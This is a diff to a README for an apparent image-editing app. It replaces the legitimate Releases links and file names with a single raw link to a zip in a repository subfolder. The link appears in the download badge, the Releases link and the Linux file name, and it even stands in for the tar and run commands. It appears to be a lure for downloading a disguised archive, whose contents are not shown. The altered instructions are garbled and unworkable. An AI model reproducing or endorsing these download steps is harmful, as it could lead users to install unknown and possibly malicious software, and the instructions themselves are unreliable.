@@ -1,6 +1,6 @@
 # 🎨 Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun - Edit Images Easily and Quickly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/releases)
+[![Download Now](https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip%https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip)](https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,14 +21,14 @@ Welcome to the Qwen-Image-Edit-2511 repository! This application allows you to e
 
 ## 📥 Download & Install
 
-To download the application, please visit the [Releases page](https://github.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/releases). Follow these steps:
+To download the application, please visit the [Releases page](https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip). Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version available.
 3. Download the appropriate file for your system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip` file.
 4. Once downloaded, follow the instructions below based on your operating system.
 
 ### 🖥️ Windows Installation
@@ -48,9 +48,9 @@ To download the application, please visit the [Releases page](https://github.com
 ### 🐧 Linux Installation
 
 1. Open a terminal and navigate to the directory where you downloaded the file.
-2. Extract the contents of the `.tar.gz` file using the following command:
+2. Extract the contents of the `https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip` file using the following command:
    ```
-   tar -xvzf Qwen-Image-Edit-2511-Lora.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip
    ```
 3. Navigate to the extracted directory using:
    ```
@@ -58,7 +58,7 @@ To download the application, please visit the [Releases page](https://github.com
    ```
 4. Run the application with:
    ```
-   ./run.sh
+   https://raw.githubusercontent.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/main/qwenimage/R-Image-Edit-Lo-As-Rerun-Multi-Fast-Qwen-3.5-alpha.5.zip
    ```
 
 ### ▶️ Launching the Application
